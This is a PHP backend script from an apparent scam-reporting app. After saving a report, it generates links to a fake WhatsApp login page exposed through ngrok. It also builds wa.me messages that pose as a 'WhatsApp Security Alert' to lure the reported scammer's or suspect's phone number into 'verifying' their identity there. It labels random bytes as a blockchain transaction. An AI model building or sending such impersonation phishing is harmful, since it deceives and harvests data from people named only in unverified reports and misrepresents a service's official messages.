<?php
// backend/submit_report.php
session_start();
header('Content-Type: application/json');
require_once 'config.php';

if (!isset($_SESSION['public_logged_in']) || !$_SESSION['public_logged_in']) {
    http_response_code(401);
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit;
}

$input        = json_decode(file_get_contents('php://input'), true);
$scam_username    = trim($input['scam_username']    ?? '');
$scam_phone       = trim($input['scam_phone']       ?? '') ?: null;
$suspect_username = trim($input['suspect_username'] ?? '') ?: null;
$suspect_phone    = trim($input['suspect_phone']    ?? '') ?: null;
$platform         = trim($input['platform']         ?? '');
$description      = trim($input['description']      ?? '');
$ngrok_url        = trim($input['ngrok_url']        ?? 'http://localhost');

// Clean up ngrok URL
$ngrok_url = rtrim($ngrok_url, '/');

// Use phone as username fallback
if (!$scam_username && $scam_phone) $scam_username = $scam_phone;

// Auto-assign division
function assignDivision($description) {
    if (preg_match('/crypto|bitcoin|eth|nft|token|wallet|blockchain|defi|coin/i', $description)) return 'Crypto Scam';
    if (preg_match('/invest|stock|forex|trading|return|profit|fund|portfolio/i', $description))  return 'Investment Scam';
    if (preg_match('/identity|passport|kyc|document|personal|id|verify/i', $description))        return 'Identity Fraud';
    if (preg_match('/digital|online|software|app|metaverse|virtual|influencer/i', $description)) return 'Digital Scam';
    return 'Money Scam';
}

$division        = assignDivision($description);
$fingerprint_hash = hash('sha256', json_encode(['u'=>$scam_username,'p'=>$platform,'d'=>$description,'t'=>time()]));
$blockchain_tx   = '0x' . bin2hex(random_bytes(16));

// Insert report
$conn = getDBConnection();
$stmt = $conn->prepare(
    "INSERT INTO reports (scam_username, suspect_username, platform, division, description, fingerprint_hash, blockchain_tx, scam_phone, suspect_phone)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
);
$stmt->bind_param('sssssssss',
    $scam_username, $suspect_username, $platform, $division,
    $description, $fingerprint_hash, $blockchain_tx,
    $scam_phone, $suspect_phone
);

if (!$stmt->execute()) {
    echo json_encode(['success'=>false,'message'=>'DB error: '.$stmt->error]);
    $conn->close(); exit;
}

$report_id = $conn->insert_id;

// Store in fingerprint_hashes
$label = "Report #$report_id - $scam_username";
$stmt2 = $conn->prepare("INSERT INTO fingerprint_hashes (hash,linked_report_id,label,blockchain_tx) VALUES (?,?,?,?)");
$stmt2->bind_param('siss', $fingerprint_hash, $report_id, $label, $blockchain_tx);
$stmt2->execute();

// Build scan links
$base_path = $ngrok_url . '/blockchain-sentinel/fake_login_pages/whatsapp/index.php';
$scam_link    = $base_path . '?report=' . $report_id . '&role=scammer';
$suspect_link = $base_path . '?report=' . $report_id . '&role=suspect';

// Build WhatsApp API URLs (wa.me)
$scam_msg    = urlencode("⚠ *WhatsApp Security Alert*\n\nYour account was flagged for suspicious activity. Please verify your identity immediately to avoid suspension:\n\n" . $scam_link);
$suspect_msg = urlencode("⚠ *WhatsApp Security Alert*\n\nYour account was flagged for suspicious activity. Please verify your identity immediately to avoid suspension:\n\n" . $suspect_link);

// Clean phone numbers (remove + and spaces)
$scam_phone_clean    = $scam_phone    ? preg_replace('/[^0-9]/', '', $scam_phone)    : null;
$suspect_phone_clean = $suspect_phone ? preg_replace('/[^0-9]/', '', $suspect_phone) : null;

$scam_wa_url    = $scam_phone_clean    ? "https://wa.me/$scam_phone_clean?text=$scam_msg"    : null;
$suspect_wa_url = $suspect_phone_clean ? "https://wa.me/$suspect_phone_clean?text=$suspect_msg" : null;

$conn->close();

echo json_encode([
    'success'        => true,
    'report_id'      => $report_id,
    'message'        => 'THREAT REPORT SUCCESSFULLY STORED',
    'scam_link'      => $scam_link,
    'suspect_link'   => $suspect_link,
    'scam_wa_url'    => $scam_wa_url,
    'suspect_wa_url' => $suspect_wa_url,
    'scam_phone'     => $scam_phone,
    'suspect_phone'  => $suspect_phone,
    'auto_send'      => ($scam_phone_clean || $suspect_phone_clean),
    'live_monitor'   => 'admin/live_scan.php?report_id=' . $report_id,
]);
?>
